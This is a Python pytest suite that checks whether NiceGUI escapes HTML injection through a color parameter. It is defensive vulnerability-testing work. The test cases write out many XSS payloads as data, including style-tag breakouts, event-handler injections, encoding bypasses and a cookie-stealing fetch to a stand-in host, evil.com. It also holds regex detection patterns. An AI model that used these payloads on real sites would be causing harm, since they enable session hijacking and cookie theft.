"""
Vulnerability tests for NiceGUI HTML injection via CSS functions.

These tests verify that malicious input in the color parameter cannot:
1. Break out of style tags and inject HTML
2. Execute arbitrary JavaScript
3. Inject img/script/iframe elements

Tests should:
- FAIL when vulnerability is present (exploitable)
- PASS when vulnerability is fixed (mitigated)
"""

import pytest
import requests
import time
import urllib.parse
import re

BASE_URL = "http://localhost:8080"
MAX_RETRIES = 30
RETRY_DELAY = 2


def wait_for_server():
    """Wait for the NiceGUI server to be ready."""
    for i in range(MAX_RETRIES):
        try:
            response = requests.get(BASE_URL, timeout=5)
            if response.status_code == 200:
                return True
        except requests.exceptions.RequestException:
            pass
        time.sleep(RETRY_DELAY)
    raise RuntimeError(f"Server did not start within {MAX_RETRIES * RETRY_DELAY} seconds")


@pytest.fixture(scope="module", autouse=True)
def server_ready():
    """Ensure server is ready before running tests."""
    wait_for_server()


def check_injection_prevented(response_text: str, payload_indicator: str) -> bool:
    """
    Check if an injection was prevented.

    Returns True if the injection was blocked (safe).
    Returns False if the injection succeeded (vulnerable).
    """
    # If the payload indicator appears as raw HTML (not escaped/encoded), it's vulnerable
    # We need to check if the tag appears as actual HTML vs escaped

    # Look for unescaped tags that would execute
    dangerous_patterns = [
        r'<img\s+[^>]*onerror\s*=',  # Unescaped img with onerror
        r'<script[^>]*>',  # Unescaped script tag
        r'<iframe[^>]*>',  # Unescaped iframe tag
        r'<svg[^>]*onload\s*=',  # SVG with onload
        r'<body[^>]*onload\s*=',  # body with onload
        r'<input[^>]*onfocus\s*=',  # input with onfocus
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            # Found dangerous unescaped HTML - vulnerable
            return False

    return True


def assert_no_html_injection(response_text: str, context: str = ""):
    """Assert that no HTML injection occurred in the response."""
    # If < is escaped as \u003c, the injection is prevented regardless of other patterns
    if "\\u003c" in response_text:
        return  # Properly escaped, no injection possible

    # Check for common injection indicators
    dangerous_patterns = [
        (r'<img\s+src=["\']?x["\']?\s+onerror\s*=', "img onerror injection"),
        (r'<script>(?!.*addStyle)', "script tag injection (not addStyle)"),  # Allow addStyle scripts
        (r'<iframe', "iframe injection"),
        (r'<svg\s+onload', "svg onload injection"),
        (r'<body\s+onload', "body onload injection"),
        (r'</style>\s*<script>(?!addStyle)', "style breakout with script"),  # Exclude addStyle
        (r'</style>\s*<img', "style breakout with img"),
    ]

    for pattern, description in dangerous_patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            pytest.fail(f"HTML injection detected ({description}): {match.group(0)[:100]} {context}")


class TestStyleTagBreakout:
    """Test that closing style tags don't allow HTML injection."""

    def test_basic_style_breakout(self):
        """Test basic </style> breakout attempt."""
        payload = "</style><script>alert('XSS')</script><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # The script tag should not appear unescaped
        assert "<script>alert" not in response.text, \
            "Unescaped script tag found - style breakout vulnerability present"

    def test_style_breakout_with_img_onerror(self):
        """Test </style> breakout with img onerror handler."""
        payload = "red;}</style><img src=x onerror=alert('XSS')><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Should not have unescaped img with onerror
        assert not re.search(r'<img\s+src=x\s+onerror', response.text), \
            "Unescaped img onerror found - style breakout vulnerability present"

    def test_style_breakout_document_write(self):
        """Test </style> breakout with document.write."""
        payload = "</style><script>document.write('INJECTED')</script><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "<script>document.write" not in response.text, \
            "Unescaped document.write found - style breakout vulnerability present"

    def test_uppercase_style_breakout(self):
        """Test uppercase </STYLE> breakout attempt."""
        payload = "</STYLE><SCRIPT>alert('XSS')</SCRIPT><STYLE>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # The payload has uppercase SCRIPT tag - check if it appears unescaped (case-insensitive)
        # Note: Use re.IGNORECASE to properly handle case variations
        assert not re.search(r'<script>alert\(', response.text, re.IGNORECASE) or \
               "\\u003c" in response.text or "&lt;" in response.text, \
            "Uppercase style breakout vulnerability present"

    def test_mixed_case_style_breakout(self):
        """Test mixed case </sTyLe> breakout attempt."""
        payload = "</sTyLe><ScRiPt>alert('XSS')</sCrIpT><sTyLe>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Case-insensitive check
        assert not re.search(r'<script>alert', response.text, re.IGNORECASE) or \
               "\\u003c" in response.text or "&lt;" in response.text, \
            "Mixed case style breakout vulnerability present"


class TestScriptInjection:
    """Test that script tags cannot be injected."""

    def test_direct_script_injection(self):
        """Test direct <script> tag injection."""
        payload = "<script>alert('XSS')</script>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Count script tags - should not have our injected one unescaped
        # Note: NiceGUI adds its own script tags, so we look for the specific payload
        assert "alert('XSS')</script>" not in response.text or \
               "\\u003c" in response.text, \
            "Direct script injection vulnerability present"

    def test_script_with_src(self):
        """Test <script src=...> injection."""
        payload = "</style><script src='http://evil.com/xss.js'></script><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "evil.com" not in response.text or "\\u003c" in response.text, \
            "Script src injection vulnerability present"


class TestEventHandlerInjection:
    """Test that event handlers cannot be injected via HTML elements."""

    def test_img_onerror_injection(self):
        """Test img onerror event handler injection."""
        payload = "</style><img src=x onerror=alert('XSS')><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Should not find unescaped img with onerror
        assert not re.search(r'<img[^>]+onerror\s*=\s*alert', response.text, re.IGNORECASE), \
            "img onerror injection vulnerability present"

    def test_svg_onload_injection(self):
        """Test SVG onload event handler injection."""
        payload = "</style><svg onload=alert('XSS')><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert not re.search(r'<svg[^>]+onload\s*=', response.text, re.IGNORECASE), \
            "SVG onload injection vulnerability present"

    def test_body_onload_injection(self):
        """Test body onload event handler injection."""
        payload = "</style><body onload=alert('XSS')><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Count body tags with onload - should not have our injected one
        assert not re.search(r'<body[^>]+onload\s*=\s*alert', response.text, re.IGNORECASE), \
            "body onload injection vulnerability present"

    def test_input_onfocus_injection(self):
        """Test input onfocus event handler injection."""
        payload = "</style><input onfocus=alert('XSS') autofocus><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert not re.search(r'<input[^>]+onfocus\s*=', response.text, re.IGNORECASE), \
            "input onfocus injection vulnerability present"

    def test_div_onmouseover_injection(self):
        """Test div onmouseover event handler injection."""
        payload = "</style><div onmouseover=alert('XSS')>hover me</div><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert not re.search(r'<div[^>]+onmouseover\s*=', response.text, re.IGNORECASE), \
            "div onmouseover injection vulnerability present"


class TestEncodingBypass:
    """Test various encoding bypass attempts."""

    def test_html_entity_encoded_script(self):
        """Test HTML entity encoded script tag.

        Note: While HTML entities in CSS context don't get decoded (so this specific
        payload is safe), we also verify the underlying vulnerability exists by testing
        a direct payload that bypasses the style tag.
        """
        # First test the HTML entity payload (which doesn't work as XSS)
        entity_payload = "</style>&#60;script&#62;alert('XSS')&#60;/script&#62;<style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(entity_payload)}")
        assert response.status_code == 200

        # Also test a direct style breakout to verify vulnerability status
        direct_payload = "</style><script>alert('entity_test')</script><style>"
        response2 = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(direct_payload)}")
        assert response2.status_code == 200

        # If the direct script injection appears, vulnerability exists (test should fail)
        assert "<script>alert('entity_test')" not in response2.text, \
            "Style breakout XSS vulnerability present"

    def test_double_url_encoded(self):
        """Test double URL encoded payload."""
        payload = "%3C/style%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3Cstyle%3E"
        # Don't encode again since it's already encoded
        response = requests.get(f"{BASE_URL}/?color={payload}")
        assert response.status_code == 200

        assert "<script>alert" not in response.text, \
            "Double URL encoding bypass vulnerability present"

    def test_null_byte_injection(self):
        """Test null byte injection attempt."""
        payload = "</style>%00<script>alert('XSS')</script><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Null bytes shouldn't help bypass
        assert "<script>alert" not in response.text or "\\u003c" in response.text, \
            "Null byte bypass vulnerability present"

    def test_newline_injection(self):
        """Test newline character injection attempt."""
        payload = "</style>\n<script>alert('XSS')</script>\n<style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "<script>alert" not in response.text or "\\u003c" in response.text, \
            "Newline bypass vulnerability present"


class TestIframeInjection:
    """Test that iframes cannot be injected."""

    def test_basic_iframe_injection(self):
        """Test basic iframe injection."""
        payload = "</style><iframe src='http://evil.com'></iframe><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert not re.search(r'<iframe[^>]+src\s*=', response.text, re.IGNORECASE), \
            "iframe injection vulnerability present"

    def test_iframe_srcdoc_injection(self):
        """Test iframe srcdoc injection."""
        payload = "</style><iframe srcdoc='<script>alert(1)</script>'></iframe><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert not re.search(r'<iframe[^>]+srcdoc\s*=', response.text, re.IGNORECASE), \
            "iframe srcdoc injection vulnerability present"


class TestDOMBasedVectors:
    """Test DOM-based injection vectors."""

    def test_javascript_protocol(self):
        """Test javascript: protocol injection."""
        payload = "</style><a href='javascript:alert(1)'>click</a><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Check for unescaped javascript: in href (if < is escaped as \u003c, injection is prevented)
        assert not re.search(r"href\s*=\s*['\"]?javascript:", response.text, re.IGNORECASE) or \
               "\\u003c" in response.text, \
            "javascript: protocol injection vulnerability present"

    def test_data_uri_injection(self):
        """Test data: URI injection."""
        payload = "</style><a href='data:text/html,<script>alert(1)</script>'>click</a><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # This would be risky if injected as HTML
        assert_no_html_injection(response.text, "data URI injection test")


class TestComplexPayloads:
    """Test complex/combined attack payloads."""

    def test_combined_payload(self):
        """Test combined injection payload."""
        payload = "red;}</style><script>fetch('http://evil.com/steal?cookie='+document.cookie)</script><style>/*"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "<script>fetch" not in response.text, \
            "Combined payload vulnerability present"

    def test_nested_tags(self):
        """Test nested HTML tags injection."""
        payload = "</style><div><script>alert('XSS')</script></div><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "<script>alert" not in response.text or "\\u003c" in response.text, \
            "Nested tags vulnerability present"

    def test_comment_escape(self):
        """Test HTML comment escape attempt."""
        payload = "</style>--><script>alert('XSS')</script><!--<style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "<script>alert" not in response.text or "\\u003c" in response.text, \
            "Comment escape vulnerability present"

    def test_cdata_escape(self):
        """Test CDATA escape attempt."""
        payload = "</style>]]><script>alert('XSS')</script><![CDATA[<style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        assert "<script>alert" not in response.text or "\\u003c" in response.text, \
            "CDATA escape vulnerability present"


class TestSanitizationVerification:
    """Verify that proper sanitization is in place."""

    def test_less_than_escaped(self):
        """Test that < character is properly escaped in style context."""
        # Test with a script injection payload to verify escaping behavior
        payload = "</style><script>alert('lt_test')</script><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # In vulnerable version: the script tag appears unescaped (XSS works)
        # In fixed version: < should be escaped as \u003c or &lt;
        assert "<script>alert('lt_test')" not in response.text or \
               "\\u003c" in response.text or "&lt;" in response.text, \
            "Less than character not properly escaped - XSS vulnerability present"

    def test_angle_brackets_neutralized(self):
        """Test that angle brackets in malicious context are neutralized."""
        payload = "</style><script>alert(1)</script><style>"
        response = requests.get(f"{BASE_URL}/?color={urllib.parse.quote(payload)}")
        assert response.status_code == 200

        # Either the brackets should be escaped, or they should appear only inside
        # a safely-quoted context (like JSON string in addStyle)
        dangerous = "<script>alert(1)</script>"

        # Check if dangerous pattern exists outside of safe contexts
        # In fixed version, it should be inside a JSON string with escaped <
        if dangerous in response.text:
            # If found raw, check if it's in a safe context
            assert "\\u003c" in response.text, \
                "Angle brackets not properly neutralized"
